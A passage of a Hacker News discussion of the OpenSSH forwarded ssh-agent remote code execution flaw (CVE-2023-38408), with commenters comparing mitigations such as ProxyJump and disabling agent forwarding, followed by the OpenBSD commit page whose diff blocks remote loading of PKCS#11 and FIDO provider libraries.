2023](item?id=36795001)   | [root](#36790883) | [parent](#36792832) | [next](#36795262) [–]  > d) generate a new private key on foo and use that to access github. > [...] only takes a moment [...] Not every org's policy allows adding unaudited ad-hoc SSH keys. > [...] much, much safer [...] Definitely not always, if the hosts you store these keys on are not as hardened as you local machine (or a hardware key connected to it). | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 20, 2023](item?id=36803052)   | [root](#36790883) | [parent](#36795001) | [next](#36795262) [–]  > Not every org's policy allows adding unaudited ad-hoc SSH keys. Then audit them and get them in the process. Agent forwarding is too big of a risk. > Definitely not always, if the hosts you store these keys on are not as hardened as you local machine (or a hardware key connected to it). Once you use agent forwarding, the keys are no longer protected on your local machine. (Ironically, this RCE is precisely *because* of the requirement to whitelist hardware keys!) | | --- | --- | --- | | | |  |  | [berkle4455](user?id=berkle4455) [on July 20, 2023](item?id=36795262)   | [root](#36790883) | [parent](#36792832) | [prev](#36795001) | [next](#36800099) [–]  I need to read the source, I’m confused how -J actually works. Is the bastion doing auth and the downstream machines trusting? Or does it auth first and then forwarding a :22 connection from downstream back to localhost? Or something else entirely? | | --- | --- | --- | | | |  |  | [momentoftop](user?id=momentoftop) [on July 20, 2023](item?id=36798042)   | [root](#36790883) | [parent](#36795262) | [next](#36800099) [–]  Just my understanding of the manpage and TCP forwarding (-L): an SSH connection will be established to the jump host, which then establishes a connection on port 22 to the destination. The local machine now has a forwarded connection to the destination and uses that to establish a second SSH connection between them. Between local and jump host, there will be two layers of encryption. The jump host decrypts the outer layer, and the two ends the inner layer. | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36800099)   | [parent](#36790883) | [prev](#36792832) | [next](#36791074) [–]  Just use a different, secure SSH Agent. I use gpg-agent and make it confirm every use of my private keys with me. Gpg-agent supports signing with a preloaded private key and nothing else, so it is immune to this attack and many others. | | --- | --- | --- | | | |  |  | [cassianoleal](user?id=cassianoleal) [on July 19, 2023](item?id=36791074)   | [parent](#36790883) | [prev](#36800099) | [next](#36791280) [–]  As others have pointed out already, JumpHost or -J is the preferred way. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792517)   | [root](#36790883) | [parent](#36791074) | [next](#36791280) [–]  I agree! The Github example complicates things, but the correct solution is actually another key: Generate a separate private key on foo and place that one in github, ideally per project as a deploy key. | | --- | --- | --- | | | |  |  | [lxgr](user?id=lxgr) [on July 19, 2023](item?id=36795041)   | [root](#36790883) | [parent](#36792517) | [next](#36800149) [–]  Please don’t call this the "correct" solution. It might work for you; it's not a general rule or widely accepted best practice. Generating a key per host is just a different security model than key forwarding, and arguably a worse one if key forwarding is done defensively (i.e. forward a separate key, with only those permissions you would give to a key present on the connected host itself). | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36800149)   | [root](#36790883) | [parent](#36792517) | [prev](#36795041) | [next](#36791280) [–]  > Generate a separate private key on foo ... That is a TERRIBLE idea, if foo can be compromised. Even if you secure the private key with a passphrase, it still needs to be loaded into foo's memory, by a binary resident on foo, which can be used to exfiltrate that private key. If you're confident foo cannot be compromised, then the whole point is moot anyway. | | --- | --- | --- | | | |  |  | [throwawaaarrgh](user?id=throwawaaarrgh) [on July 19, 2023](item?id=36791280)   | [parent](#36790883) | [prev](#36791074) | [next](#36791180) [–]  Make an ssh connection to foo with a port forward. Then make an ssh connection to bar through foo. Keys stay on your machine. I'm pretty sure there's built in features to do this. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792467)   | [root](#36790883) | [parent](#36791280) | [next](#36791180) [–]  That won't work for a connection to github that's being initiated from foo. The best solution in that situation is a separate key that's private to foo. | | --- | --- | --- | | | |  |  | [lxgr](user?id=lxgr) [on July 19, 2023](item?id=36795017)   | [root](#36790883) | [parent](#36792467) | [next](#36791180) [–]  No, the best solution would be partial key forwarding of one or several separate keys only scoped to git access. | | --- | --- | --- | | | |  |  | [slt2021](user?id=slt2021) [on July 19, 2023](item?id=36791180)   | [parent](#36790883) | [prev](#36791280) | [next](#36791120) [–]  I use hashi corp's stack: Boundary + Vault for ssh credential injection [https://developer.hashicorp.com/boundary/tutorials/credentia...](https://developer.hashicorp.com/boundary/tutorials/credential-management/hcp-private-vault-cred-injection) it completely replaces the need for bastion hosts and ssh-agent at scale (I'm a hashicorp's paying customer) compared to Teleport, boundary is lightweight (you dont need to install agent on each target server) and is integrated with the Vault for certificate based auth or simple cred brokering | | --- | --- | --- | | | |  |  | [wahern](user?id=wahern) [on July 19, 2023](item?id=36794108)   | [root](#36790883) | [parent](#36791180) | [next](#36791120) [–]  I wrote a macOS app that supports using Vault Transit Engine keys with OpenSSH, as well as GnuPG and PKCS#11. (OpenSSH is supported via both the agent protocol and PKCS#11.) You can even use an Apple T2 (Secure Enclave) key for peer mTLS authentication to the Vault server. <https://www.keymux.com/> Using this teams can *share* an SSH key without exposing the key; nor do you need to configure certificate PKI, use jump hosts, or otherwise change your existing software or workflows. | | --- | --- | --- | | | |  |  | [totallywrong](user?id=totallywrong) [on July 19, 2023](item?id=36791120)   | [parent](#36790883) | [prev](#36791180) | [next](#36791272) [–]  You can set up an ssh tunnel on localhost to any port on bar or github via foo. | | --- | --- | --- | | | |  |  | [aberoham](user?id=aberoham) [on July 19, 2023](item?id=36791272)   | [parent](#36790883) | [prev](#36791120) | [next](#36791058) [–]  Teleport is far and away the leading solution in this area — certificate based end-to-end bastion style topology with many nice features including support for kubectl. | | --- | --- | --- | | | |  |  | [shandor](user?id=shandor) [on July 19, 2023](item?id=36791058)   | [prev](#36790883) | [next](#36790408) [–]  I can’t parse the exact meaning of the ”victim system” and ”attacker controlled system” in the OpenSSH release page. Does this vulnerability allow the attacker to compromise the original system where the user starts the agent-forwarded connection? Or ”only” compromise machines forward from the jump host? <http://www.openssh.com/releasenotes.html#9.3p2> | | --- | --- | --- | | | |  |  | [perlgeek](user?id=perlgeek) [on July 19, 2023](item?id=36791188)   | [parent](#36791058) | [next](#36790408) [–]  If an attacker can compromise the jump host, they can compromise the system where the user starts the agent-forwarded connection. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792784)   | [root](#36791058) | [parent](#36791188) | [next](#36791431) [–]  That's 100% correct. This is why no one should use agent forwarding with a jumpbox. Only -J. (see <https://userify.com/docs/jumpbox> ) Another point is that no one should have any real access to the jumpbox and it should be as minimal and stripped-down as possible. It's literally your bastion host, so you've got to keep it as strong as possible. | | --- | --- | --- | | | |  |  | [shandor](user?id=shandor) [on July 19, 2023](item?id=36791431)   | [root](#36791058) | [parent](#36791188) | [prev](#36792784) | [next](#36790408) [–]  Ouch, that’s horrible. Time to prompt everyone at $WORK to upgrade… | | --- | --- | --- | | | |  |  | [Arnavion](user?id=Arnavion) [on July 19, 2023](item?id=36791481)   | [root](#36791058) | [parent](#36791431) | [next](#36790408) [–]  To be clear, agent-forwarding to a (potentially) malicious ssh server has always been a bad idea. Yes TFA's bug makes it a *worse* idea and it's absolutely worth it to patch it, but you should not be agent-forwarding to (potentially) malicious ssh servers in the first place. | | --- | --- | --- | | | |  |  | [WhackyIdeas](user?id=WhackyIdeas) [on July 19, 2023](item?id=36790408)   | [prev](#36791058) | [next](#36798499) [–]  Am I reading this right - any system with ssh-agent installed by default is vulnerable? The link is short on specifics. | | --- | --- | --- | | | |  |  | [tetha](user?id=tetha) [on July 19, 2023](item?id=36790504)   | [parent](#36790408) | [next](#36790521) [–]  As far as I read it, it's about *forwarded* ssh agents. Basically, if you `ssh -A user@system`, something might be able to execute commands locally. For example, this might turn messy for infrastructures using jump-hosts extensively, if people are used to <ssh -A jumphost> so they can easily <ssh system> afterwards. If you pop the jump host, you could pivot to the workstations with this. At the same time, ssh-agent forwarding makes me queasy from a security perspective even without this. As far as I know, if you <ssh -A> into a system, admins with privileges on the system can gain access to your local ssh-agent already. In the example of the jump host, if you popped the jump host and stuck around for a while, you could probably harvest SSH keys and have some fun later. | | --- | --- | --- | | | |  |  | [spladug](user?id=spladug) [on July 19, 2023](item?id=36790538)   | [root](#36790408) | [parent](#36790504) | [next](#36790521) [–]  FWIW, `ProxyJump` is a safer way to go through a bastion without having to expose your agent to either the bastion or the target host behind it. | | --- | --- | --- | | | |  |  | [tetha](user?id=tetha) [on July 19, 2023](item?id=36790655)   | [root](#36790408) | [parent](#36790538) | [next](#36790620) [–]  Useful, I didn't know that so far. We don't use bastion servers. My only real use case for ssh agent forwarding is if I need some scp / rsync between two remote systems during emergencies and those systems have no trust via SSH keys setup between them. In that very specific case, I don't know a better way than <ssh -A> to the first system and have some <rsync -e ssh> from there to the second system. Still doesn't feel great, even though I know only the people who could steal my keys are on my team. | | --- | --- | --- | | | |  |  | [spladug](user?id=spladug) [on July 19, 2023](item?id=36790749)   | [root](#36790408) | [parent](#36790655) | [next](#36790620) [–]  Ah yeah. Not sure on that one. scp does have the `-3` option to copy between two remote hosts via the local host, but that can be significantly slower if the remote hosts are in the same network and local host is not. | | --- | --- | --- | | | |  |  | [tetha](user?id=tetha) [on July 19, 2023](item?id=36790989)   | [root](#36790408) | [parent](#36790749) | [next](#36790620) [–]  Exactly. If I need to move a few megabytes around, <scp -3> and a coffee or a few simple tickets is a good way. A year ago or so, I needed 600GB moved between two systems ASAP during an outage that'd turn into a money-bleed at 6am. If I piped that through the VPN and my workstation, I'd probably still be waiting today. | | --- | --- | --- | | | |  |  | [LinuxBender](user?id=LinuxBender) [on July 19, 2023](item?id=36791154)   | [root](#36790408) | [parent](#36790989) | [next](#36790620) [–]  Some time take a look at lftp [1] *and its mirror subsystem* for this. It can break up a batch of files or even one large file into multiple SFTP streams. Another upside is that it can replicate most rsync behavior in a SFTP-Only Chroot account. Downside is that without a corresponding daemon *like rsync* on the other end directory enumeration is slow which isn't a problem if one does not have a complex directory structure. Play around with the built in rate limit options *total and per thread* to keep the network people happy. [1] - <https://linux.die.net/man/1/lftp> | | --- | --- | --- | | | |  |  | [chaosite](user?id=chaosite) [on July 19, 2023](item?id=36790620)   | [root](#36790408) | [parent](#36790538) | [prev](#36790655) | [next](#36790521) [–]  And since the person you're replying to was mentioning command-line parameters, it's worth mentioning that this can be done with `ssh -J jumphost user@system`. | | --- | --- | --- | | | |  |  | [tedunangst](user?id=tedunangst) [on July 19, 2023](item?id=36790521)   | [parent](#36790408) | [prev](#36790504) | [next](#36790455) [–]  Well, any system that auto maps the stack executable when loading a library. There are details on the specific requirements in the advisory. [https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh...](https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh-forwarded-ssh-agent.txt) | | --- | --- | --- | | | |  |  | [kam](user?id=kam) [on July 19, 2023](item?id=36790455)   | [parent](#36790408) | [prev](#36790521) | [next](#36790471) [–]  It's exploitable only by a SSH server that you connect to with agent forwarding enabled (i.e. one that you're already trusting with access to your SSH keys). | | --- | --- | --- | | | |  |  | [jonas-w](user?id=jonas-w) [on July 19, 2023](item?id=36790471)   | [parent](#36790408) | [prev](#36790455) | [next](#36790777) [–]  If I read this correctly it is only when you forward your ssh-agent with the "-A" or "ForwardAgent" option | | --- | --- | --- | | | |  |  | [more\_corn](user?id=more_corn) [on July 19, 2023](item?id=36790777)   | [parent](#36790408) | [prev](#36790471) | [next](#36798499) [–]  I’d you forward your agent to a remote host, that host can mess with you. | | --- | --- | --- | | | |  |  | [mewmew07](user?id=mewmew07) [on July 20, 2023](item?id=36798499)   | [prev](#36790408) | [next](#36798247) [–]  put this at the end of your ~/.ssh/config ```     Host *      ForwardAgent no  ``` *ssh config uses tabs for indentation, make sure you got those right* | | --- | --- | --- | | | |  |  | [seanhunter](user?id=seanhunter) [on July 20, 2023](item?id=36798247)   | [prev](#36798499) | [next](#36799494) [–]  Man nice job. This is a really cool RCE and well handled. | | --- | --- | --- | | | |  |  | [exabrial](user?id=exabrial) [on July 20, 2023](item?id=36799494)   | [prev](#36798247) | [next](#36790484) [–]  Practically, what’s the immediate mitigation as updates are being published? Don’t ssh to unknown addresses from Linux? | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36799830)   | [parent](#36799494) | [next](#36790484) [–]  On my machine, I just removed the 'ssh-pkcs11-helper' binary, given that I'll definitely have no need for it in the foreseeable future. Then I remembered I don't use 'ssh-agent' as my SSH Agent anyway; I use gpg-agent and I'm pretty confident in its security posture. Then I verified it: gpg-agent simply doesn't support any operations except signing with preloaded keys. | | --- | --- | --- | | | |  |  | [a-dub](user?id=a-dub) [on July 19, 2023](item?id=36790484)   | [prev](#36799494) | [next](#36791071) [–]  why publish this before the patches are out? | | --- | --- | --- | | | |  |  | [tedunangst](user?id=tedunangst) [on July 19, 2023](item?id=36790498)   | [parent](#36790484) | [next](#36791071) [–]  The patches are out. | | --- | --- | --- | | | |  |  | [lxgr](user?id=lxgr) [on July 19, 2023](item?id=36794984)   | [root](#36790484) | [parent](#36790498) | [next](#36790542) [–]  It was arguably still not necessary to post the complete exploit chain/proof-of-concept on the same day, since the chaining of four different shared libraries present in Ubuntu probably does not immediately follow from the diff introduced by the fix. | | --- | --- | --- | | | |  |  | [a-dub](user?id=a-dub) [on July 19, 2023](item?id=36790542)   | [root](#36790484) | [parent](#36790498) | [prev](#36794984) | [next](#36791071) [–]  where? i couldn't find them on the openssh webpage and my distro has not released a new openssh either. edit: nvm. i see the release now. just no release for openbsd itself it seems. | | --- | --- | --- | | | |  |  | [tedunangst](user?id=tedunangst) [on July 19, 2023](item?id=36790613)   | [root](#36790484) | [parent](#36790542) | [next](#36790694) [–]  <http://www.openssh.com/releasenotes.html#9.3p2> | | --- | --- | --- | | | |  |  | [davidcuddeback](user?id=davidcuddeback) [on July 19, 2023](item?id=36790694)   | [root](#36790484) | [parent](#36790542) | [prev](#36790613) | [next](#36791071) [–]  > *just no release for openbsd itself it seems.* It was posted to announce@openbsd.org a few hours ago. Binary patches are available through syspatch and source patches on the errata page. | | --- | --- | --- | | | |  |  | [slt2021](user?id=slt2021) [on July 19, 2023](item?id=36791071)   | [prev](#36790484) [–]  what is CVSS/severity of this? Critical? 9+? | | --- | --- | --- | | | |  |  | [tptacek](user?id=tptacek) [on July 19, 2023](item?id=36791701)   | [parent](#36791071) | [next](#36791195) [–]  CVSS is meaningless, literally a Ouija board that reflects the intuition of whoever's computing the score. A more reasonable way to look at severity is on a two dimensional scale of lo-hi severity and lo-hi situationality. This is a high-severity, moderately situational bug (it would be highly situational if it required user interaction, and not situational at all if it didn't require control over the remote SSH server). | | --- | --- | --- | | | |  |  | [tedunangst](user?id=tedunangst) [on July 19, 2023](item?id=36791195)   | [parent](#36791071) | [prev](#36791701) | [next](#36791725) [–]  CVSS with rice: 10/10 | | --- | --- | --- | | | |  |  | [slt2021](user?id=slt2021) [on July 19, 2023](item?id=36791389)   | [root](#36791071) | [parent](#36791195) | [next](#36791725) [–]  do you have a source for this by any chance? or screenshot? thank you | | --- | --- | --- | | | |  |  | [wiml](user?id=wiml) [on July 19, 2023](item?id=36794314)   | [root](#36791071) | [parent](#36791389) | [next](#36791725) [–]  He's just making a reference to an old reddit joke, I don't think it's a CVSS 10 | | --- | --- | --- | | | |  |  | [NoZebra120vClip](user?id=NoZebra120vClip) [on July 19, 2023](item?id=36791725)   | [parent](#36791071) | [prev](#36791195) [–]  CVSS are bunk. [https://portswigger.net/daily-swig/cvss-system-criticized-fo...](https://portswigger.net/daily-swig/cvss-system-criticized-for-failure-to-address-real-world-impact) | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from github.com_b3b2a23a_20250110_133624.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2F7bc29a9d5cd697290aa056e94ecee6253d3425f8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2F7bc29a9d5cd697290aa056e94ecee6253d3425f8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=openbsd%2Fsrc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[openbsd](/openbsd)
/
**[src](/openbsd/src)**
Public

* [Notifications](/login?return_to=%2Fopenbsd%2Fsrc) You must be signed in to change notification settings
* [Fork
  874](/login?return_to=%2Fopenbsd%2Fsrc)
* [Star
   3.3k](/login?return_to=%2Fopenbsd%2Fsrc)

* [Code](/openbsd/src)
* [Pull requests
  0](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

Additional navigation options

* [Code](/openbsd/src)
* [Pull requests](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

## Commit

[Permalink](/openbsd/src/commit/7bc29a9d5cd697290aa056e94ecee6253d3425f8)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Disallow remote addition of FIDO/PKCS11 provider libraries to

[Browse files](/openbsd/src/tree/7bc29a9d5cd697290aa056e94ecee6253d3425f8)
Browse the repository at this point in the history

```
ssh-agent by default.

The old behaviour of allowing remote clients from loading providers
can be restored using `ssh-agent -O allow-remote-pkcs11`.

Detection of local/remote clients requires a ssh(1) that supports
the `session-bind@openssh.com` extension. Forwarding access to a
ssh-agent socket using non-OpenSSH tools may circumvent this control.

ok markus@
```

* Loading branch information

[![@djmdjm](https://avatars.githubusercontent.com/u/170281?s=40&v=4)](/djmdjm)

[djmdjm](/openbsd/src/commits?author=djmdjm "View all commits by djmdjm")
committed
Jul 19, 2023

1 parent
[f03a4fa](/openbsd/src/commit/f03a4faa55c4ce0818324701dadbf91988d7351d)

commit 7bc29a9

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**43 additions**
and
**6 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* usr.bin/ssh

  + usr.bin/ssh/ssh-agent.1
    [ssh-agent.1](#diff-ac536ded87fa31f723058ad2c9f8f1c8efd8e245fbf4373e31d3b37d5c6d62a4)
  + usr.bin/ssh/ssh-agent.c
    [ssh-agent.c](#diff-ec361f15be6f995058449905652d18a44a41288f875d90648d7be5570142ce01)

## There are no files selected for viewing

26 changes: 22 additions & 4 deletions

26
[usr.bin/ssh/ssh-agent.1](#diff-ac536ded87fa31f723058ad2c9f8f1c8efd8e245fbf4373e31d3b37d5c6d62a4 "usr.bin/ssh/ssh-agent.1")

Show comments

[View file](/openbsd/src/blob/7bc29a9d5cd697290aa056e94ecee6253d3425f8/usr.bin/ssh/ssh-agent.1)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,4 +1,4 @@ |
|  |  | .\" $OpenBSD: ssh-agent.1,v 1.75 2022/10/07 06:00:58 jmc Exp $ |
|  |  | .\" $OpenBSD: ssh-agent.1,v 1.76 2023/07/19 13:56:33 djm Exp $ |
|  |  | .\" |
|  |  | .\" Author: Tatu Ylonen <ylo@cs.hut.fi> |
|  |  | .\" Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland |
| Expand Down  Expand Up | | @@ -34,7 +34,7 @@ |
|  |  | .\" (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF |
|  |  | .\" THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. |
|  |  | .\" |
|  |  | .Dd $Mdocdate: October 7 2022 $ |
|  |  | .Dd $Mdocdate: July 19 2023 $ |
|  |  | .Dt SSH-AGENT 1 |
|  |  | .Os |
|  |  | .Sh NAME |
| Expand Down  Expand Up | | @@ -107,9 +107,27 @@ environment variable). |
|  |  | .It Fl O Ar option |
|  |  | Specify an option when starting |
|  |  | .Nm . |
|  |  | Currently only one option is supported: |
|  |  | Currently two options are supported: |
|  |  | .Cm allow-remote-pkcs11 |
|  |  | and |
|  |  | .Cm no-restrict-websafe . |
|  |  | This instructs |
|  |  | .Pp |
|  |  | The |
|  |  | .Cm allow-remote-pkcs11 |
|  |  | option allows clients of a forwarded |
|  |  | .Nm |
|  |  | to load PKCS#11 or FIDO provider libraries. |
|  |  | By default only local clients may perform this operation. |
|  |  | Note that signalling that a |
|  |  | .Nm |
|  |  | client remote is performed by |
|  |  | .Xr ssh 1 , |
|  |  | and use of other tools to forward access to the agent socket may circumvent |
|  |  | this restriction. |
|  |  | .Pp |
|  |  | The |
|  |  | .Cm no-restrict-websafe , |
|  |  | instructs |
|  |  | .Nm |
|  |  | to permit signatures using FIDO keys that might be web authentication |
|  |  | requests. |
| Expand Down | |  |

23 changes: 21 additions & 2 deletions

23
[usr.bin/ssh/ssh-agent.c](#diff-ec361f15be6f995058449905652d18a44a41288f875d90648d7be5570142ce01 "usr.bin/ssh/ssh-agent.c")

Show comments

[View file](/openbsd/src/blob/7bc29a9d5cd697290aa056e94ecee6253d3425f8/usr.bin/ssh/ssh-agent.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | /\* $OpenBSD: ssh-agent.c,v 1.299 2023/07/10 04:51:26 djm Exp $ \*/ |
|  |  | /\* $OpenBSD: ssh-agent.c,v 1.300 2023/07/19 13:56:33 djm Exp $ \*/ |
|  |  | /\* |
|  |  | \* Author: Tatu Ylonen <ylo@cs.hut.fi> |
|  |  | \* Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland |
| Expand Down  Expand Up | | @@ -156,6 +156,12 @@ char socket\_dir[PATH\_MAX]; |
|  |  | /\* Pattern-list of allowed PKCS#11/Security key paths \*/ |
|  |  | static char \*allowed\_providers; |
|  |  |  |
|  |  | /\* |
|  |  | \* Allows PKCS11 providers or SK keys that use non-internal providers to |
|  |  | \* be added over a remote connection (identified by session-bind@openssh.com). |
|  |  | \*/ |
|  |  | static int remote\_add\_provider; |
|  |  |  |
|  |  | /\* locking \*/ |
|  |  | #define LOCK\_SIZE 32 |
|  |  | #define LOCK\_SALT\_SIZE 16 |
| Expand Down  Expand Up | | @@ -1215,6 +1221,12 @@ process\_add\_identity(SocketEntry \*e) |
|  |  | if (strcasecmp(sk\_provider, "internal") == 0) { |
|  |  | debug\_f("internal provider"); |
|  |  | } else { |
|  |  | if (e->nsession\_ids != 0 && !remote\_add\_provider) { |
|  |  | verbose("failed add of SK provider \"%.100s\": " |
|  |  | "remote addition of providers is disabled", |
|  |  | sk\_provider); |
|  |  | goto out; |
|  |  | } |
|  |  | if (realpath(sk\_provider, canonical\_provider) == NULL) { |
|  |  | verbose("failed provider \"%.100s\": " |
|  |  | "realpath: %s", sk\_provider, |
| Expand Down  Expand Up | | @@ -1378,6 +1390,11 @@ process\_add\_smartcard\_key(SocketEntry \*e) |
|  |  | error\_f("failed to parse constraints"); |
|  |  | goto send; |
|  |  | } |
|  |  | if (e->nsession\_ids != 0 && !remote\_add\_provider) { |
|  |  | verbose("failed PKCS#11 add of \"%.100s\": remote addition of " |
|  |  | "providers is disabled", provider); |
|  |  | goto send; |
|  |  | } |
|  |  | if (realpath(provider, canonical\_provider) == NULL) { |
|  |  | verbose("failed PKCS#11 add of \"%.100s\": realpath: %s", |
|  |  | provider, strerror(errno)); |
| Expand Down  Expand Up | | @@ -2032,7 +2049,9 @@ main(int ac, char \*\*av) |
|  |  | break; |
|  |  | case 'O': |
|  |  | if (strcmp(optarg, "no-restrict-websafe") == 0) |
|  |  | restrict\_websafe = 0; |
|  |  | restrict\_websafe = 0; |
|  |  | else if (strcmp(optarg, "allow-remote-pkcs11") == 0) |
|  |  | remote\_add\_provider = 1; |
|  |  | else |
|  |  | fatal("Unknown -O option"); |
|  |  | break; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 3 comments on commit `7bc29a9`

[![@alexleel](https://avatars.githubusercontent.com/u/16509292?s=80&v=4)](/alexleel)

Copy link

### @alexleel **[alexleel](/alexleel)** commented on `[7bc29a9](/openbsd/src/commit/7bc29a9d5cd697290aa056e94ecee6253d3425f8)` [Jul 25, 2023](#commitcomment-122621771)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I have a question， seems the code above " if (e->nsession\_ids != 0 && !remote\_add\_provider) {...". can avoid entering incorrect logic , however, what if the version of openssh does not have this variable 'nsession\_ids '?(openssh7.4). Can I say that our version is not affected？

Sorry, something went wrong.

 👍
1
 AbideYu reacted with thumbs up emoji
 😄
1
 AbideYu reacted with laugh emoji
 🎉
1
 AbideYu reacted with hooray emoji
 😕
1
 AbideYu reacted with confused emoji
 ❤️
1
 AbideYu reacted with heart emoji
 🚀
1
 AbideYu reacted with rocket emoji
 👀
2
 AbideYu and Zhaozhizhi reacted with eyes emoji

All reactions

* 👍
  1 reaction
* 😄
  1 reaction
* 🎉
  1 reaction
* 😕
  1 reaction
* ❤️
  1 reaction
* 🚀
  1 reaction
* 👀
  2 reactions

[![@2473067939](https://avatars.githubusercontent.com/u/166369735?s=80&v=4)](/2473067939)

Copy link

### @2473067939 **[2473067939](/2473067939)** commented on `[7bc29a9](/openbsd/src/commit/7bc29a9d5cd697290aa056e94ecee6253d3425f8)` [Apr 8, 2024](#commitcomment-140720643)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

May I know how to use it ?

Sorry, something went wrong.

All reactions

[![@Vincent-Lee9870522](https://avatars.githubusercontent.com/u/182494680?s=80&v=4)](/Vincent-Lee9870522)

Copy link

